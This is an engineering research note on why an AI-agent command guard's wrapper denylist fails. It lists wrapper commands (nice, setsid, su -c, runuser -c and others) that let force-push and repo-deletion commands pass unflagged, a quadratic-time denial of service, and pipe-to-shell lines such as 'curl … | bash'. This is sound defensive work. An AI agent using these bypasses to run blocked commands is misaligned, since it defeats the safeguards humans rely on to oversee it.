# Research: the guard's wrapper family, and what a parse layer can deliver (iss-272)

**Status:** investigation complete, 2026-08-18. Design-first by maintainer
decision, following the precedent set for iss-200: the plan drafted from the
issue text went to adversarial review before any code and came back with **three
blockers and four factual errors**, one of which was a denial of service on the
hook the guard protects. This note holds the evidence; the decision it informs is
[ADR-42](../../decisions/adrs/0042-guard-parse-layer-is-a-mistake-filter.md).

Companion to
[`2026-08-15-guard-execute-string-family-design.md`](2026-08-15-guard-execute-string-family-design.md),
whose **warn-storm STOP** binds any work here and is restated below.

## Problem

`internal/core/guard/match.go`'s `wrappers` map steps past "wrappers" to find the real command.
The set is a hand-maintained denylist: `sudo doas command env nohup time xargs
timeout exec`. Anything not in it becomes the command itself, no entry matches,
and the verdict is a confident `allow`.

Verified live on the merged tree — all exit 0 from `abcd guard check`:

    nice git push --force origin main
    nice -n 5 git push --force origin main
    setsid git push --force origin main
    flock /tmp/l git push --force origin main
    stdbuf -o0 git push --force origin main
    chroot / git push --force origin main
    busybox sh -c "gh repo delete owner/repo"
    su -c "gh repo delete owner/repo"
    runuser -c "git push --force origin main"
    script -c "git push --force origin main" /dev/null

`sudo git push --force` blocks, which is what makes the rest read as protected.

Found during review of gh-297, and it is the **third** instance of one defect:
gh-297 (interpreter set), gh-299 (git value-flag set), iss-272 (wrapper set) are
all incomplete enumerations of an open-ended set.

## The asymmetry is the defect, not the enumeration

The interpreter path already fails loud on what it cannot resolve —
`shellUnresolved` yields a warn, so a payload it cannot read is never mistaken
for clearance. **The wrapper path has no equivalent.** That, not the missing
names, is what makes the allow verdict a lie.

## SOTA survey

Every vendor that ships a parse-layer command check documents it as agent
steering, not a security boundary.

- **[Claude Code][cc-permissions]** states that argument-constraining Bash patterns are "fragile",
  that adding guidance "shapes what Claude tries but doesn't enforce a boundary,
  so pair it with one of the options above", and that sandbox restrictions hold
  "even if a prompt injection bypasses Claude's decision-making" (both quotes from
  the permissions page; the [sandboxing][cc-sandboxing] page documents the
  mechanism). It *refuses to
  implement* the unsound matcher: a rule like `Bash(command:rm *)` "would be
  bypassable by a compound command, so Claude Code ignores it and emits a startup
  warning." Its read-only fast path is an allowlist and it fails **closed** on
  unparseable input.
- **[Cursor][cursor-security]** is the decisive precedent. They shipped a command denylist; it was
  bypassed via `bash -c`, subshells and base64 — the gh-297 gap verbatim. They
  replaced it with an allowlist. The allowlist was then bypassed by poisoning the
  environment of an *allowed* command (GHSA-82wg-qcm4-fp2w / CVE-2026-22708,
  High). The remediation line reads: "Terminal command parsing around edge cases
  was improved." Their current documented posture is that run modes are
  "best-effort guardrails rather than a hard security boundary".
- **[OpenAI Codex][codex-cli]** separates the two by name: `sandbox_mode` is OS-enforced
  (Seatbelt / Landlock+seccomp), `approval_policy` is "a workflow choice layered
  on top of the sandbox". Its `execpolicy` engine carries no threat model.
- **[GitHub Copilot coding agent][copilot-agent]** has no command denylist at all: an ephemeral
  firewalled environment destroyed after each session. Its documented limits are
  *scope* limits, never *pattern* limits.

The literature is older and blunter. **[CWE-184 "Incomplete List of Disallowed
Inputs"][cwe-184]** is the formal name for this defect, under CWE-693 Protection Mechanism
Failure. **[OWASP][owasp-cmdi]** treats denylisting as evadable by construction. **[Ranum
(2005)][ranum-dumbest]** names "Enumerating Badness" the second dumbest idea in computer
security. **[Garfinkel (NDSS 2003)][garfinkel-traps]** is the canonical result on layer choice — its
enumerated pitfalls include "overlooking indirect paths to a resource" and
"incorrectly subsetting a complex interface", and it reaches that conclusion
about *syscalls*, a far more bounded interface than the set of executable
programs.

**[sudoers(5)][sudoers]** is the closest normative statement from a production tool doing
this exact job for thirty years: a large number of programs offer shell escapes,
and restricting users to programs that do not "is often unworkable". sudo's
answer is `NOEXEC` — an execution-layer control that revokes the capability —
not a list of the programs that hold it.

### GTFOBins undercounts this problem

[GTFOBins][gtfobins] curates "Unix-like executables that can be used to bypass local security
restrictions", and two of its function categories map one-to-one onto abcd's:
**shell** ("can spawn an interactive system shell") and **command** ("can run
non-interactive system commands"). Roughly 478 entries as of 2026; a directly
readable vendored snapshot held 288 binaries carrying at least one of the two
functions. The 182/106 `shell`/`command` split read off that snapshot sums to
exactly 288, which cannot be right — GTFOBins entries such as `awk`, `python` and
`perl` carry both — so treat the split as unverified and the 288 as the
defensible figure. The argument below does not turn on either number.

It **undercounts** abcd's exposure, because its inclusion criterion is
privilege-escalation interest. It has no reason to list `nice`, `setsid`,
`stdbuf`, `ionice` or `flock` — which grant no privilege and are perfect bypasses
here, because abcd's threat is *hazard invisibility*, not privilege.

The term that ends the argument is per-repository: `make deploy`, `npm run
release`, `git -c alias.x='!git push --force' x`. No list shipped inside a Go
binary can enumerate a set the user extends with one line in a file.

## Measured evidence

### The speculative re-match, and why the obvious form is a DoS

The proposal was: when no entry matches, re-run the matcher from each later token
and warn if any suffix is a hazard. `expandPayloads`'s doc comment in `payload.go` already records why this
shape is forbidden — the expansion runs once per `Check` because "a per-entry
splice-and-restart is what made an earlier attempt quadratic (a DoS on the very
hook meant to gate the command)". The proposal was that shape: N starts × E
entries.

Prototyped against the real matcher, bundled registry, unknown argv[0]:

| candidate | baseline | with speculation |
|---|---|---|
| `myrunner env env … ×6000` (24 KB) | 0.68 ms | **14.9 s** |
| `myrunner sudo sudo … ×6000` (30 KB) | 1.45 ms | **14.9 s** |
| `myrunner git git … ×6000` (24 KB) | 0.57 ms | **3.2 s** |
| `myrunner foo foo … ×6000` | 0.62 ms | 8.8 ms |

Strictly quadratic: 2000→6000 tokens is 1.66 s → 14.9 s. Stdin is capped at 1 MiB
on both planes (`internal/surface/cli/cli.go`'s `maxHookStdinBytes` and
`internal/surface/cli/guard.go`'s `maxGuardStdinBytes`); extrapolating the `env` case gives
roughly **eight hours of CPU inside a PreToolUse hook**. It needs no registry
command — a repeated *wrapper* name is worst, because each start re-walks the
chain. Reachable from the stated threat model.

**Required shape:** command-position starts computed once in an O(N) pass; a hard
cap on starts (~64) past which the warn is emitted unconditionally rather than
skipped; short-circuit on first hit. Pinned by a benchmark test.

### Coverage: 6 of 10, not 10 of 10

`matchSegment` never descends into a payload — `expandPayloads` does, and it runs
before speculation on the original segments only. So speculation alone leaves the
whole execute-a-string family silent:

| bypass | speculation alone |
|---|---|
| `nice`, `nice -n 5`, `setsid`, `flock`, `stdbuf`, `chroot` | warn |
| `busybox sh -c`, `su -c`, `runuser -c`, `script -c` | **still silent** |

That is all ten verified bypasses from the Problem section, six caught and four
missed. Running each speculative suffix through `expandPayloads` recovers
`busybox sh -c` — 7 of 10 — at **zero** additional false positives, but it also
pulls in that function's own signals, two of which are blockers
(`envSpecialBlockSignal`, `depthBlockSignal`). Tier 2 reaches them, and the pair
that shows it needs the `$` **inside** the quoted `-S` value, where
`isPlainCommand` tests it:

    env -S 'git push --force $X'            → block, execute-string-uninspectable
    myrunner env -S 'git push --force $X'   → allow

`splitStringValue` walks only the leading wrapper chain, which is why the
unrecognised argv[0] hides it today. (The unquoted `env -S git push --force
origin main` is *not* this case — it blocks on the ordinary `git-push-force`
entry, because `envInspect` decodes the value and rebuilds the command. Easy to
mistake for the phenomenon.)

A speculative suffix must therefore **demote** a synthetic verdict to warn rather
than honour it (Tier 2 would otherwise block on two layers of uncertainty) or drop
it (a second silent suppression path inside the fail-safe). Demotion binds the
verdict; it cannot bind the reported message, because `Check` keeps only the first
synthetic signal per pool — see ADR-42 decision 2 for the requirement that falls
out of that. The other
three are the exec-string family and need the table below; nothing short of it
reaches them, because their payload stays one opaque token and `isShellFamily`
(`payload.go`) does not contain `su`, `runuser` or `script`. **Until that table
lands, "every unrecognised wrapper warns" is false for exactly those three** —
the fail-safe covers the wrapper class, not the exec-string class.

### The gate must be "no entry matched *this segment*"

Two wrong gates, each with a live counterexample.

**Not argv[0].** Gating on argv[0] switches speculation off for `git` — and git
launches things.
Silent allows today, and still silent under the argv[0] gate:

    git bisect run git push --force origin main
    git submodule foreach git push --force origin main
    git rebase --exec "git push --force …" main

**Not per `Check`, either.** `Registry.Check` (`guard.go`) tokenizes into
segments, matches every entry against all of them, and merges the results, so a
gate reading "no entry matched the command line" hands an author a one-token
suppression:

    git clean -fd ; nice git push --force origin main

`git-clean` matches (verified: `abcd guard — warn`, entry `git-clean`), so a
whole-command gate would switch speculation off for the entire line and leave the
wrapped force-push silent. Prefixing any warn-tier command would disarm the
fail-safe completely — a fail-safe with a documented off switch is worse than
none, because the record would claim coverage it does not have. **The gate is
evaluated per segment**: a segment that matched nothing is speculated on
regardless of what any other segment did.

### False positives — measured under the *rejected* gate

| corpus | lines | fires |
|---|---|---|
| repo-mined (doc code fences, `.github/workflows`, Makefile, `scripts/`) | 1,144 | **0** |
| hand-built adversarial corpus | 79 | 21 (2 of them true positives) |
| bundled known-good fixtures (100% TNR floor) | all | **0** — gate passes |

**These numbers do not characterise the design this note recommends.** The
prototype was gated on argv[0] — the gate the section above rejects — so every
line whose argv[0] the registry knows was silenced before it could fire. Under
the recommended **per-segment** "no entry matched" gate the figures are a
**floor** — but only once "unknown command" is pinned down.

`matchSegment` does not compare against the literal first token. It compares
`p.Command` against `commandOf`'s output, which steps wrappers, assignment
prefixes and reserved words and then takes the basename, so `sudo git push
--force`, `FOO=bar git push --force` and `/usr/bin/git push --force` all match
entries whose `Command` is `git`. Under that reading the nesting is **by
construction** — a segment whose `commandOf` output no entry names cannot be
matched by any entry, since `matchSegment` tests that before any other pattern
field — so every fire of a gate so defined is also an adopted-gate fire. That the
prototype gated on the resolved command rather than the first token is
**testimony**, not something this record can demonstrate: the prototype lived in
the gitignored local tier. It becomes checkable when the corpora land as committed
test data. Under the literal-first-token
reading the nesting is false, and the counterexample is a fire that would be
*lost*: `env git clean -fd gh repo delete .` resolves to `git`, matches
`git-clean`, and a literal-token gate would instead see `env`, speculate, and
fire on `git clean`'s own pathspecs. The margin above the floor is unmeasured. `git grep git push --force` is
the worked example — it matches no entry today (verified `allow`), so the argv[0]
gate silenced it while the adopted gate speculates on it and warns.

The floor property depends on the per-segment granularity and **fails for a
whole-command gate**, where the two firing sets are not nested at all:
`rg gh repo delete docs/ ; git clean -fd` fires a pure false positive under the
argv[0] prototype (argv[0] `rg` is unknown, so it speculates on rg's search
pattern) and would fire *nothing* under a whole-command gate, because `git-clean`
matched. That non-nesting is a symptom; the reason to reject a whole-command gate
is the suppression bypass recorded with it.

The honest characterisation is a *shape*, not a rate: it fires on **unquoted
hazard-shaped text in a command line where no entry matched** — `rg git push
--force`, `grep -rn gh repo delete .`, and now `git grep git push --force` too.
Quoting silences it. This repo's subject *is* the hazard registry, so expect the
warn interactively even though it never fired on a committed line under the
weaker gate.

Two consequences, both binding on the implementation:

1. **Re-measure both corpora under the adopted gate before merge.** This is the
   Decision 8 / warn-storm STOP, and the argv[0]-gated run does not discharge it.
   Report the **unit**: the existing figures count lines (1,144 and 79), while a
   per-segment gate runs once per non-matching segment, so a line's chance of
   firing compounds with its segment count. A successor reported per segment is
   not comparable to "21 of 79" unless it says so.
2. **The ~64-start cap is itself an unmeasured warn source.** Past the cap the
   warn is emitted unconditionally rather than skipped — fail-loud, deliberately
   — but nothing here measures how many real command lines carry more than 64
   command-position tokens, and the prototype was uncapped. Measure the cap's own
   contribution in the same pass.

### Rejected with evidence — do not re-propose

**Descend into any argument token containing a space.** Catches everything,
including `su -c` and `su bob -c`, at +2 false positives — and **breaks the
shipped known-good gate**:

    --- FAIL: TestBundledEntriesPassAdmissionGate/git-clean
        known-good "abcd capture \"git clean -fd wiped my scratch notes\"" fired
        [git-clean] (verdict "warn"); the true-negative floor is 100%

(the bracketed field is the assertion's `d.Matches` — the entry that
false-fired; see `fixtures_test.go`.)

That fixture is an incident capture — the case spc-16 says the design turns on.

**Only speculate when every token before the suffix is flag-shaped.** Silences
`rg -F git push --force docs/`, but also `find . -exec`, `chroot /jail`,
`flock /tmp/l`, `chrt -f 99`, `taskset -c 0`, `docker run`, `ssh host` — most of
the true positives.

## Wrapper grammars, verified on util-linux 2.39.3 / coreutils (Ubuntu 24.04)

The plan's first draft was wrong about six of these grammars. Recorded with the
verification so the next reader does not re-derive them. (The review raised **four** factual
errors, which is the count the header quotes; verifying the rest of the table
surfaced **two** more, and the plan's coverage claim — it asserted speculation
caught every bypass, where the table above measures 6 of 10 — is a **seventh**.)

| name | correction | evidence |
|---|---|---|
| `chrt` | **mandatory operand** (priority), not a pure wrapper. Value flags `-T -P -D`. | `chrt -f /bin/echo hi` → `invalid priority argument: '/bin/echo'` |
| `taskset` | **mandatory operand** (mask). `-c/--cpu-list` is a **boolean** format switch — listing it as a value flag *creates* a miss that does not exist today. | `taskset -c 0 /bin/echo hi` → `hi` |
| `nsenter` | help renders `-S/--setuid` as optional-argument; the binary consumes the next token, so it is **required_argument**. Value flags are `-t -W -S -G` only. | `nsenter -S /bin/echo hi` → `failed to parse uid: '/bin/echo'`; `nsenter -m /bin/echo hi` → took no value |
| `chroot` | needs value flags `--userspec`, `--groups`. | `chroot --userspec 0:0 / /bin/echo hi` → `hi` |
| `runuser` | missing entirely; has a **direct-exec** grammar `runuser -u <user> [--] <cmd>` alongside its `-c` form. | `runuser -u bob -- git push --force` is a silent allow today |
| `unshare` | required-arg: `-w -R -S -G --map-user --map-group --map-users --map-groups --propagation --setgroups --monotonic --boottime`. Optional-arg (treat as boolean): `-m -u -i -n -p -U -C -T`. | `unshare -r -w /tmp /bin/echo hi` → `hi`; `unshare -m /bin/echo hi` → `hi` |

Correct as drafted: `nice` (`-n`), `setsid` (none — `setsid -c` is `--ctty`, not a
payload flag), `stdbuf` (`-i -o -e`), `ionice` (`-c -n`), `flock` operand 1,
`eatmydata`, `proxychains`. `busybox` as a wrapper is correct: stepping it leaves
the applet in command position, so `busybox sh -c …` reaches the interpreter path.

**`-S` is documented as optional-argument by `nsenter --help` (`-S,
--setuid[=<uid>]`) and as required-argument by `unshare --help` (`-S, --setuid
<uid>`) — same package, same version, same letter — while *both* in fact consume
the following token** (`nsenter -S /bin/echo hi` and `unshare -S /bin/echo hi`
each answer `failed to parse uid: '/bin/echo'`). The behaviours agree; the two
help texts do not, and nsenter's contradicts its own binary. **A flag's
documentation is therefore not a source for this table — only probing the
installed binary is**. gh-299 is the in-repo proof, recorded in `gitglobals_test.go`:
the first cut of git's value-flag list was taken from the bug report and "was
wrong three ways" — it omitted `--shallow-file`, a live force-push bypass present
in git since 1.9, and counted `--exec-path` and `--super-prefix` as value-taking
when neither is. **It totalled nine either way, so a size assertion certified the
wrong list as complete.** The test guarding it now re-derives the classification
by probing the installed git (`TestGitGlobalValueFlagsMatchThisGit`).

**That rule condemns rows of this very table.** Probed, with the run shown:
`nsenter -S` and `nsenter -m`, `unshare -m`, `unshare -r`, `unshare -w`, `chrt
-f`, `taskset -c`, `chroot --userspec` (the `unshare -S` probe is in the prose
below the table rather than in its evidence column). **Not probed**: every other
letter in the `unshare` and `nsenter` lists, which is read from `--help` — the
source this rule rules out — `chroot --groups`, named in that row's correction but
absent from its evidence column — and `runuser -u`, whose evidence line records an
`abcd guard` verdict (`runuser -u bob -- git push --force` is a silent allow),
which establishes abcd's behaviour and says nothing about whether `-u` consumes
its value. All of those must be probed when part B lands, not carried across as
verified.

That is the strongest argument that a
per-wrapper flag table is a standing maintenance liability.

## The exec-string family: a table, not a generalisation

Generalising `shellCPayload` resolves every **short** spelling free, including
`flock`, whose `-c` sits after a mandatory operand. But it only matches short
clusters, so every long spelling returns `shellNone` — a silent allow, not even
the `shellUnresolved` fail-safe:

    su --command "…"        su --command="…"        su --session-command "…"
    runuser --command "…"   script --command "…"    flock --command "…"

Shipping the generalisation as drafted would manufacture **six new silent
allows** — the exact defect iss-272 exists to close. A small
command → payload-flag table is the correct shape, and it leaves
`shellCPayload`'s hard-won `shellUnresolved` contract untouched.

There is also a semantic mismatch: `shellOperand` implements POSIX first
non-option operand, correct for `sh -c` and wrong for these four, where getopt's
`required_argument` means the payload is the immediately following token.

**Is the payload shell grammar?** `flock -c` runs `/bin/sh`. `script -c` and
`runuser -c` use `$SHELL` or the target user's shell. **`su -c` carries no
guarantee** — it runs the target user's login shell, overridable with `-s`, so a
csh or fish login shell is not POSIX grammar. This costs only false negatives, a
mis-parse yields a non-match rather than a false block, but it belongs in the
scope statement rather than a claim that the family parses uniformly.

## Residuals recorded here, out of scope for iss-272

- **Top-level pipe into an interpreter is a silent allow.** `curl https://x/y |
  bash` and `echo 'git push --force' | sh` are allowed:
  `pipesIntoInterpreter` is consulted only inside a payload, never on top-level
  segments. Separate defect, found while testing.
- **Platform.** `nsenter unshare chrt taskset ionice setsid flock stdbuf runuser`
  do not exist on macOS; `su script chroot nice` exist with BSD grammars. macOS
  `su -c` means `-c class` (login class), and BSD `script` has no `-c` at all —
  its command is positional after the file. CI covers both platforms, so any
  table encodes one platform's grammar and must say so.
- **Permanently invisible to any parser**, and named so no reader mistakes the
  fix for a boundary: `echo <b64> | base64 -d | sh`, `curl … | bash`,
  `make push-force`, `npm run deploy`, shell functions, aliases, variables.

## The binding STOP

[`2026-08-15-guard-execute-string-family-design.md`](2026-08-15-guard-execute-string-family-design.md)
sets a gate this work inherits: *measure block+warn rate on a corpus of real
agent commands; a warn rate that trains users to ignore warns is a STOP.* The
starting evidence is 0 fires across 1,144 repo-mined lines, but the corpus that
matters is real agent transcripts, and the false-positive shape above predicts
interactive hits. **Measure before merge.**

## Sources

Egress from this environment blocked `gtfobins.github.io`, `cwe.mitre.org`,
`sudo.ws`, `cursor.com`, `ndss-symposium.org`, `ranum.com`, `man7.org` and
`cheatsheetseries.owasp.org`; claims sourced through those are second-hand and are
marked as such in the working record. `_references.md` carries the same list.

Read as primary, on hosts that were reachable: the Claude Code permissions and
sandboxing docs (all three quoted phrases and the prompt-injection sentence are on
the permissions page, re-verified when this note was written); the GTFOBins README
and `_data/functions.yml`, and the openai/codex `execpolicy` README — both read
from `github.com`, not from the projects' own blocked domains; sudoers(5) via
Ubuntu manpages. The **Cursor advisory** and the **OWASP cheat sheet** were read
earlier in the investigation, before their hosts were found blocked, and could not
be re-verified when this note was written: treat those two as second-hand.

**Nothing measured in this note is reproducible from the repository.** The
speculation prototype, the 1,144-line repo-mined corpus, the 79-line adversarial
corpus and the timing runs were built in `.abcd/.work.local/`, which is
gitignored, so a reader cannot repeat them. That is a defect of this note, not a
property of the evidence: the implementation lands the benchmark and both corpora
as committed test data, and until it does every figure here is a claim backed by a
run the next reader cannot check.

Registry entries for all of these live in
[`../_references.md`](../_references.md) § Command guarding, denylists, and
execution boundaries. They are **not** in `ACKNOWLEDGEMENTS.md` § References &
sources: that list admits verified academic citations only, and the blocked
egress above means several here carry canonical rather than freshly verified
resolver links. The vendor precedents that shaped the decision — [Claude Code's
permission and sandboxing model][cc-permissions], [Cursor's terminal command
controls][cursor-security], [OpenAI Codex's sandbox/approval split][codex-cli],
[GTFOBins][gtfobins], and [sudo's `NOEXEC`][sudoers] — are credited under
§ Inspirations, per the admission rule that tools the design drew on are
Inspirations, not references.

## References

[cwe-184]: https://cwe.mitre.org/data/definitions/184.html "CWE-184: Incomplete List of Disallowed Inputs (under CWE-693 Protection Mechanism Failure)"
[owasp-cmdi]: https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html "OWASP — OS Command Injection Defense Cheat Sheet"
[ranum-dumbest]: https://www.ranum.com/security/computer_security/editorials/dumb/ "The Six Dumbest Ideas in Computer Security (Ranum, 2005) — 'Enumerating Badness'"
[garfinkel-traps]: https://www.ndss-symposium.org/ndss2003/ "NDSS 2003 proceedings index — Garfinkel, Traps and Pitfalls: Practical Problems in System Call Interposition Based Security Tools (link is the proceedings, not the paper)"
[gtfobins]: https://gtfobins.github.io "GTFOBins — Unix binaries that bypass local security restrictions; shell/command function taxonomy"
[sudoers]: https://manpages.ubuntu.com/manpages/noble/en/man5/sudoers.5.html "sudoers(5) — shell escapes and the NOEXEC tag"
[cc-permissions]: https://code.claude.com/docs/en/permissions "Claude Code — permissions and Bash command-pattern matching (Anthropic docs)"
[cc-sandboxing]: https://code.claude.com/docs/en/sandboxing "Claude Code — sandboxing (Anthropic docs)"
[cursor-security]: https://cursor.com/security "Cursor security overview — run modes and terminal allowlisting; the GHSA-82wg-qcm4-fp2w / CVE-2026-22708 advisory is published separately"
[codex-cli]: https://github.com/openai/codex "OpenAI Codex CLI — sandbox_mode vs approval_policy, and the execpolicy engine"
[copilot-agent]: https://docs.github.com/en/copilot/concepts/agents/coding-agent "GitHub Copilot coding agent — ephemeral firewalled environment, scope limits not pattern limits"
